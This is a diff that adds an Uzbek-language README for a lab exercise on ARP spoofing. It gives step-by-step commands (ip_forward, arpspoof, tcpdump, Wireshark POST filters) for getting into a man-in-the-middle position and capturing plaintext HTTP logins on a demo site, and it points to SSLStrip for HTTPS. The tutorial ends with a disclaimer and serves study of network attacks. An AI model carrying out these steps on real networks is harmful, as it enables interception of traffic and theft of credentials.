@@ -1,0 +1,105 @@
+# NetworkUshbu laboratoriya ishi mahalliy tarmoqda ARP Spoofing hujumini amalga oshirish va uning ishlash mexanizmini o'rganishga bag'ishlangan. 
+Hujum natijasida nishon qurilma va router o'rtasidagi trafik hujumchi qurilmasi orqali o'tishi ta'minlanadi.
+
+🛠 Atrof-muhit va Qurilmalar
+Hujumchi (Kali Linux): 172.18.183.71
+
+Nishon (Jabrlanuvchi): 172.18.183.123
+
+Gateway (Router): 172.18.183.1
+
+Asboblar: arpspoof, dsniff, sysctl, wireshark
+
+🚀 Bosqichma-bosqich Ko'rsatma
+1-bosqich: IP Forwarding (Yo'naltirish)ni yoqish
+Hujumchi qurilmasi orqali o'tayotgan trafik to'xtab qolmasligi va nishon internetga ulanishda davom etishi uchun trafikni qayta yo'naltirishni yoqamiz.
+
+Bash
+sudo sysctl -w net.ipv4.ip_forward=1
+Eslatma: Bu buyruq paketlarni o'zida ushlab qolmasdan, nishonga yetkazib berishni ta'minlaydi.
+
+2-bosqich: ARP Spoofing Hujumini boshlash
+Nishon qurilmaga "Men routernman" mazmunidagi soxta ARP paketlarini yuboramiz.
+
+Bash
+sudo arpspoof -i eth0 -t 172.18.183.123 172.18.183.1
+Parametrlar tushuntirishi:
+
+-i eth0: Foydalanilayotgan tarmoq interfeysi.
+
+-t 172.18.183.123: Nishon qurilmaning IP manzili.
+
+172.18.183.1: Router (Gateway) IP manzili.
+
+3-bosqich: Kesh zaharlanganligini tekshirish
+Nishon qurilmada ARP keshini tekshirib, hujum muvaffaqiyatini tasdiqlaymiz:
+
+Bash
+ip neigh show
+Kutilgan natija: 172.18.183.1 IP manzili uchun MAC manzili hujumchining MAC manzili bilan bir xil bo'lib qoladi.
+
+4-bosqich: Trafikni tahlil qilish
+Trafik hujumchi orqali o'tayotgan vaqtda paketlarni ushlash va tahlil qilish mumkin:
+
+Bash
+# TCP trafikni terminalda kuzatish
+sudo tcpdump -i eth0 host 172.18.183.123
+Yoki vizual tahlil uchun Wireshark dasturini ishga tushiring.
+
+🕵️ 5-bosqich: Shifrlanmagan ma'lumotlarni tutib olish (Sniffing)
+ARP Spoofing muvaffaqiyatli amalga oshirilgach, biz "O'rtadagi odam" (Man-in-the-Middle) holatiga kelamiz. Agar nishon qurilma shifrlanmagan HTTP protokoli orqali ishlaydigan saytlarga kirsa,
+biz uning login va parollarini ko'ra olamiz.
+
+Laboratoriya uchun nishon sayt:
+http://zero.webappsecurity.com (Ushbu sayt login/parollar tarmoq bo'ylab ochiq holatda o'tishini sinash uchun maxsus yaratilgan).
+
+Amallar ketma-ketligi:
+Wireshark-ni ishga tushiring:
+Terminalda wireshark buyrug'ini bering va nishon bilan bog'langan interfeysni (masalan, eth0) tanlang.
+
+Filtr o'rnating:
+Keraksiz trafikni yashirish uchun filtr satriga quyidagilarni yozing:
+
+HTTP
+http.request.method == "POST"
+Bu filtr faqat ma'lumot yuborish (login/parol) paketlarini ko'rsatadi.
+
+Ma'lumotni ushlash va tahlil qilish:
+Nishon qurilma saytga kirib, login va parolni kiritganidan so'ng, Wireshark-da paket paydo bo'ladi:
+
+POST /login.html yozuvli paketni toping.
+
+Ustiga o'ng tugmani bosib, Follow -> HTTP Stream tanlang.
+
+📊 Natija:
+Ochilgan oynada siz nishon kiritgan ma'lumotlarni quyidagi ko'rinishda ko'rishingiz mumkin:
+user_login=doston&user_password=parol123&...
+
+💡 Muhim texnik eslatmalar
+Internet uzilib qolishi: Agar nishon qurilmada saytlar ochilmay qolsa, bu sizning Kali Linux qurilmangiz paketlarni o'tkazmayotganini anglatadi. IP Forwarding holatini qayta tekshiring:
+
+Bash
+cat /proc/sys/net/ipv4/ip_forward
+(Agar natija 0 bo'lsa, uni qaytadan 1 ga tushiring).
+
+HTTPS muammosi: Zamonaviy saytlarning ko'pchiligi (Google, Facebook va h.k.) HTTPS (shifrlangan) ishlatadi. Bunday holatlarda ma'lumotlarni ko'rish uchun qo'shimcha SSLStrip kabi vositalar talab qilinadi.
+
+GitHub uchun vizual maslahat:
+README faylingizga Wireshark-da login/parol ko'ringan joyining skrinshotini qo'shsangiz, loyihangiz juda ishonchli va professional ko'rinadi. Faqat skrinshotda o'zingizning haqiqiy parollaringizni 
+ko'rsatmaslikka ehtiyot bo'ling! 😉
+
+
+🛑 Laboratoriyani yakunlash
+Hujumni to'xtatish uchun terminalda Ctrl+C bosing. Nishondagi keshni tozalash va tarmoqni asl holiga qaytarish uchun:
+
+Bash
+sudo ip neigh flush all
+⚠️ Ogohlantirish (Disclaimer)
+Ushbu material faqat ta'lim va kiberxavfsizlikni o'rganish maqsadida tayyorlangan. Ruxsatsiz qurilmalarga hujum qilish qonunga xilofdir.
+
+GitHub uchun tavsiyalar:
+Screenshots: Har bir bosqichning skrinshotlarini (ayniqsa ip neigh show natijasini) olib, images/ papkasiga joylang va README'ga link bering.
+
+Formatting: Kod bloklari uchun Markdown formatidan foydalanilgan, bu GitHub'da sintaksisni chiroyli ko'rsatadi.
+
+About: GitHub repository qismiga Cybersecurity, Penetration Testing, ARP Spoofing kabi teglar (tags) qo'shishni unutmang.
